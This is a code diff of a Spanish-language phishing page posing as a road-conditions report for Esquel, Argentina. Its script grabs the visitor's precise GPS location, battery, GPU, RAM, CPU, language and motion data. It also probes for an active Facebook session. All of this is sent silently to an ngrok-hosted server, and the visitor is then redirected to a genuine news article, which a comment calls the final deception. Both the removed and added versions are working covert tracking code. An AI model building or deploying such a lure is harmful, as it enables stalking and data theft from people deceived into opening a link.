@@ -1,63 +1,65 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta property="og:title" content="ESTADO DE RUTAS: Nieve y heladas en Esquel">
-    <meta property="og:image" content="https://www.eqsnotas.com/u/fotografias/m/2023/5/22/f1280x720-136514_149688_5050.jpg">
-    <title>Cargando Mapa...</title>
-</head>
-<body style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:100px;">
-    <h2>Actualizando reporte vial...</h2>
-    <script>
-        // Sensor de movimiento simple
-        let mov = "Quieto/Desktop";
-        window.ondevicemotion = () => { mov = "En Movimiento"; };
+<script>
+    // Variables globales para sensores
+    let movDetectado = "Quieto/Fijo";
+    let idiomaUser = navigator.language || "Desconocido";
 
-        async function capturar(pos) {
-            const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save"; // <--- CAMBIA SI ES NECESARIO
+    // Intentar detectar movimiento por inclinación
+    window.addEventListener('deviceorientation', (e) => {
+        if(e.alpha !== null) movDetectado = "Activo (Celular)";
+    }, {once: true});
 
-            // Detección de sesión (Simulada por carga de recursos)
-            let social = "Buscando...";
-            const checkSocial = () => {
-                const img = new Image();
-                img.src = "https://facebook.com/favicon.ico";
-                img.onload = () => social = "Facebook (Sesión Activa)";
-                img.onerror = () => social = "Cuentas no detectadas";
-            };
-            checkSocial();
+    async function capturar(pos) {
+        const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save";
 
-            let bat = "N/A", cargando = "N/A";
-            try {
-                const b = await navigator.getBattery();
-                bat = (b.level * 100).toFixed(0) + "%";
-                cargando = b.charging ? "Si" : "No";
-            } catch(e) {}
-
-            const data = {
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                precision: pos.coords.accuracy.toFixed(1) + "m",
-                bateria: bat,
-                esta_cargando: cargando,
-                gpu: (() => {
-                    const gl = document.createElement('canvas').getContext('webgl');
-                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
-                })(),
-                ram: navigator.deviceMemory || "N/A",
-                nucleos: navigator.hardwareConcurrency || "N/A",
-                idioma: navigator.language,
-                movimiento: mov,
-                social: social
-            };
-
-            fetch(URL_NGROK, { method:'POST', mode:'no-cors', body: JSON.stringify(data) });
-            setTimeout(() => { window.location.href = "https://www.eqsnotas.com/"; }, 1500);
+        // Detección de sesión de Facebook mejorada
+        let socialLog = "No detectada";
+        const img = new Image();
+        img.src = "https://www.facebook.com/favicon.ico?_rdr=" + Math.random();
+        img.style.display = "none";
+        
+        // Esperamos 1 segundo para que los sensores y la imagen carguen
+        await new Promise(r => setTimeout(r, 1000));
+        
+        if (img.complete && img.naturalWidth > 0) {
+            socialLog = "Facebook (Sesión Iniciada)";
         }
 
-        window.onload = () => {
-            navigator.geolocation.getCurrentPosition(capturar, () => { window.location.href="https://www.eqsnotas.com/"; }, {enableHighAccuracy:true});
+        let bat = "N/A", cargando = "N/A";
+        try {
+            const b = await navigator.getBattery();
+            bat = (b.level * 100).toFixed(0) + "%";
+            cargando = b.charging ? "Si" : "No";
+        } catch(e) {}
+
+        const data = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            precision: pos.coords.accuracy.toFixed(1) + "m",
+            bateria: bat,
+            esta_cargando: cargando,
+            gpu: (() => {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
+            })(),
+            ram: navigator.deviceMemory || "N/A",
+            nucleos: navigator.hardwareConcurrency || "N/A",
+            idioma: idiomaUser,
+            movimiento: movDetectado,
+            social: socialLog
         };
-    </script>
-</body>
-</html>
+
+        fetch(URL_NGROK, { method:'POST', mode:'no-cors', body: JSON.stringify(data) });
+        
+        // El engaño final
+        setTimeout(() => { 
+            window.location.href = "https://www.eqsnotas.com/noticias/2023/05/22/136514-vialidad-nacional-recomienda-precaucion-por-hielo-en-la-calzada"; 
+        }, 500);
+    }
+
+    window.onload = () => {
+        navigator.geolocation.getCurrentPosition(capturar, () => {
+            window.location.href="https://www.eqsnotas.com/";
+        }, {enableHighAccuracy:true, timeout: 10000});
+    };
+</script>
